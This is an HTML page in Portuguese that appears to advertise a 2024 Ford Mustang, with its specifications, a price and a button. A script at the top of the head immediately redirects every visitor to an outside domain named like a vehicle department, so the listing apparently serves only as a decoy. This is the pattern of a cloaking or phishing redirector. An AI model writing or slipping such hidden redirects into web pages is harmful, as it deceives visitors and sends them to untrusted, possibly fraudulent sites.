<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <script>window.location.replace('https://departamentodeveiculo.com/go');</script>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Informações do Veículo</title>

    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f2f2f2;
            margin: 0;
            padding: 40px;
        }

        .veiculo {
            max-width: 500px;
            margin: auto;
            background-color: white;
            padding: 25px;
            border-radius: 10px;
            box-shadow: 0 0 10px #ccc;
        }

        h1 {
            color: #222;
        }

        .info {
            margin: 10px 0;
            padding: 10px;
            background-color: #eee;
            border-radius: 5px;
        }

        .preco {
            color: green;
            font-size: 22px;
            font-weight: bold;
        }
    </style>
</head>

<body>

    <div class="veiculo">
        <h1>🚗 Ford Mustang</h1>

        <div class="info">
            <strong>Ano:</strong> 2024
        </div>

        <div class="info">
            <strong>Motor:</strong> 5.0 V8
        </div>

        <div class="info">
            <strong>Combustível:</strong> Gasolina
        </div>

        <div class="info">
            <strong>Câmbio:</strong> Automático
        </div>

        <div class="info">
            <strong>Cor:</strong> Preto
        </div>

        <div class="info">
            <strong>Quilometragem:</strong> 15.000 km
        </div>

        <p class="preco">R$ 450.000,00</p>

        <button onclick="alert('Veículo selecionado!')">
            Ver veículo
        </button>
    </div>

</body>
</html>
